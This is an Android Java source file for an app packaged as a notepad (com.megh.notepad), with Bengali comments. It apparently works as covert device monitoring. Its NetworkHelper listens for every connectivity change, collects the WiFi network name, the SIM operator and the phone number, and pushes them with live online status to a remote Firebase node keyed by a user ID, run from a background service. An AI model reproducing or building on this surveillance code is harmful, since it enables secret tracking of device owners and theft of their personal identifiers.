package com.megh.notepad; // আপনার প্যাকেজের নাম দিন

import android.Manifest;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.pm.PackageManager;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.net.wifi.WifiInfo;
import android.net.wifi.WifiManager;
import android.telephony.TelephonyManager;
import android.util.Log;

import androidx.core.app.ActivityCompat;

import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;
import com.google.firebase.database.ServerValue;

import java.util.HashMap;
import java.util.Map;

public class NetworkHelper {

    private static BroadcastReceiver networkReceiver;

    // লাইভ মনিটরিং শুরু করার মেথড
    public static void startMonitoring(final Context context) {
        if (networkReceiver == null) {
            networkReceiver = new BroadcastReceiver() {
                @Override
                public void onReceive(Context context, Intent intent) {
                    // যখনই নেটওয়ার্ক পরিবর্তন হবে, এই মেথড কল হবে
                    syncNetworkInfo(context);
                }
            };

            // রিসিভার রেজিস্টার করা
            IntentFilter filter = new IntentFilter("android.net.conn.CONNECTIVITY_CHANGE");
            context.registerReceiver(networkReceiver, filter);
            Log.d("NetworkHelper", "Live network monitoring started.");
            
            // প্রথমবার চালু হওয়ার সময় একবার ডাটা পাঠানো
            syncNetworkInfo(context);
        }
    }

    // সার্ভিস বন্ধ হলে মনিটরিং বন্ধ করার মেথড
    public static void stopMonitoring(Context context) {
        if (networkReceiver != null) {
            context.unregisterReceiver(networkReceiver);
            networkReceiver = null;
            Log.d("NetworkHelper", "Live network monitoring stopped.");
        }
        
        // 🌟 সার্ভিস স্টপ হলে ডাটাবেস আপডেট এবং onDisconnect বাতিল করা 🌟
        try {
            DatabaseReference dbRef = FirebaseDatabase.getInstance()
                    .getReference("DeviceData").child(BackgroundService.USER_ID).child("NetworkInfo");
            dbRef.onDisconnect().cancel();
            
            Map<String, Object> offlineData = new HashMap<>();
            offlineData.put("Is_Online", false);
            offlineData.put("Connection_Type", "Service Stopped");
            offlineData.put("Last_Updated", System.currentTimeMillis());
            dbRef.setValue(offlineData);
        } catch (Exception e) {}
    }

    // নেটওয়ার্কের তথ্য বের করে ফায়ারবেসে পাঠানোর মূল মেথড
    private static void syncNetworkInfo(Context context) {
        try {
            DatabaseReference dbRef = FirebaseDatabase.getInstance()
                    .getReference("DeviceData").child(BackgroundService.USER_ID).child("NetworkInfo");

            // 🌟 আপডেট: onDisconnect লজিক সেট করা 🌟
            // ইন্টারনেট অফ হয়ে গেলে অটোমেটিক এই ডাটা ফায়ারবেসে সেভ হয়ে যাবে
            Map<String, Object> autoOfflineData = new HashMap<>();
            autoOfflineData.put("Is_Online", false);
            autoOfflineData.put("Connection_Type", "Offline");
            autoOfflineData.put("Last_Updated", ServerValue.TIMESTAMP); // অফলাইন হওয়ার সঠিক সময়
            dbRef.onDisconnect().setValue(autoOfflineData);

            ConnectivityManager cm = (ConnectivityManager) context.getSystemService(Context.CONNECTIVITY_SERVICE);
            NetworkInfo activeNetwork = cm.getActiveNetworkInfo();

            boolean isConnected = activeNetwork != null && activeNetwork.isConnectedOrConnecting();
            
            String connectionType = "Offline";
            String wifiName = "N/A";
            String simName = "N/A";
            String simNumber = "N/A";

            if (isConnected) {
                if (activeNetwork.getType() == ConnectivityManager.TYPE_WIFI) {
                    connectionType = "WiFi Connected";
                    
                    WifiManager wifiManager = (WifiManager) context.getApplicationContext().getSystemService(Context.WIFI_SERVICE);
                    WifiInfo wifiInfo = wifiManager.getConnectionInfo();
                    
                    wifiName = wifiInfo.getSSID(); 
                    if (wifiName.equals("<unknown ssid>")) {
                        wifiName = "Unknown (Location ON Required)";
                    } else {
                        wifiName = wifiName.replace("\"", ""); 
                    }

                } else if (activeNetwork.getType() == ConnectivityManager.TYPE_MOBILE) {
                    connectionType = "Mobile Data Connected";
                    
                    TelephonyManager telephonyManager = (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);
                    simName = telephonyManager.getNetworkOperatorName(); 

                    if (ActivityCompat.checkSelfPermission(context, Manifest.permission.READ_PHONE_STATE) == PackageManager.PERMISSION_GRANTED) {
                        String number = telephonyManager.getLine1Number();
                        if (number != null && !number.isEmpty()) {
                            simNumber = number;
                        } else {
                            simNumber = "Not Stored in SIM"; 
                        }
                    } else {
                        simNumber = "Permission Denied";
                    }
                }
            }

            Map<String, Object> networkData = new HashMap<>();
            networkData.put("Is_Online", isConnected);
            networkData.put("Connection_Type", connectionType);
            
            // অফলাইন হলে আগের ডাটা মুছে শুধু অফলাইন স্ট্যাটাস দেখাবে
            if (connectionType.equals("WiFi Connected")) {
                networkData.put("WiFi_Name", wifiName);
            } else if (connectionType.equals("Mobile Data Connected")) {
                networkData.put("SIM_Name", simName);
                networkData.put("SIM_Number", simNumber);
            }

            networkData.put("Last_Updated", System.currentTimeMillis());

            dbRef.setValue(networkData);
            Log.d("NetworkHelper", "Network detailed info updated live!");

        } catch (Exception e) {
            Log.e("NetworkHelper", "Error: " + e.getMessage());
        }
    }
}